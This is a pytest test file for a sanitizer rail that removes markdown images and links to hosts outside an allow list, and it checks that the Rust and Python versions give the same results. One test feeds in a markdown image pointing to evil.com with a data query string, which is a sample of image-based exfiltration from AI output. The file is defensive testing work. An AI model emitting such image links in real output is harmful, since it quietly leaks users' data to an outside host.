import json
from pathlib import Path

import pytest

from core.native import HAVE_RUST, _py_sanitize_markup, sanitize_markup
from core.rail import Action, RailContext
from rails.output.sanitize import SanitizeRail

VECTORS = json.loads((Path(__file__).parent / "vectors" / "sanitize.json").read_text("utf-8"))


@pytest.mark.parametrize("vec", VECTORS, ids=[v["name"] for v in VECTORS])
def test_sanitize_matches_vectors(vec):
    assert sanitize_markup(vec["input"], vec["allow_hosts"]) == vec["expected"]


@pytest.mark.parametrize("vec", VECTORS, ids=[v["name"] for v in VECTORS])
def test_rust_python_parity(vec):
    if not HAVE_RUST:
        pytest.skip("Rust extension not installed — parity checked in the rust-core CI lane")
    rust = sanitize_markup(vec["input"], vec["allow_hosts"])
    py = _py_sanitize_markup(vec["input"], vec["allow_hosts"])
    assert rust == py


def test_rail_modifies_on_exfil_image():
    ctx = RailContext(text="leak ![x](https://evil.com/i?d=abc) end")
    decision = SanitizeRail().inspect(ctx)
    assert decision.action is Action.MODIFY
    assert "evil.com" not in decision.modified


def test_rail_allows_clean_text():
    assert SanitizeRail().inspect(RailContext(text="all good here")).action is Action.ALLOW
